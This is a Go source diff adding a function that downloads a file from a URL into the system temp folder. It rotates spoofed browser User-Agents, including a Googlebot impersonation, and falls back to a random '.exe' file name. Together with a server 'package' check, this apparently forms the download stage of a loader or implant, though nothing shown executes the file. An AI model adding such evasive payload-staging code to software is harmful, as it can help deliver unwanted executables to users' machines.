@@ -8,7 +8,11 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"os"
+	"path"
+	"path/filepath"
 	"strconv"
+	"time"
 )
 
 var clientHTTP = &http.Client{
@@ -166,4 +170,75 @@ func check_package_legality(pkg *ServerReply) bool {
 	}
 
 	return true
+}
+
+func download_from_url(url, file_name string) string {
+	// HTTP agent with overtime limitation
+	client := &http.Client{
+		Timeout: 20 * time.Second,
+	}
+
+	// Create a new HTTP GET request
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return ""
+	}
+	// Create a fake UA
+	var UserAgents = []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Linux; Android 13; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Electron/29.1.0 Chrome/122.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	}
+	// Set HTTP header and send GET request
+	req.Header.Set("User-Agent", UserAgents[g_seed.Intn(len(UserAgents))])
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+
+	// Check statuscode of http response
+	if resp.StatusCode != 200 {
+		return ""
+	}
+
+	// Build save path
+	final_file_path := ""
+	temp_file_name := ""
+
+	if file_name == "" {
+		// If user doesn't specfiy file path, try to parse it from url
+		temp_file_name = path.Base(resp.Request.URL.Path)
+		if temp_file_name == "" || temp_file_name == "/" {
+			// Oops, no? use default
+			temp_file_name = random_string(random_int(5, 17)) + ".exe"
+		}
+
+	} else {
+		temp_file_name = file_name
+	}
+	final_file_path = filepath.Join(os.TempDir(), temp_file_name)
+
+	// Create file
+	f, err := os.Create(final_file_path)
+	if err != nil {
+		return ""
+	}
+	defer f.Close()
+
+	_, err = io.Copy(f, resp.Body)
+	if err != nil {
+		return ""
+	}
+
+	return final_file_path
 }
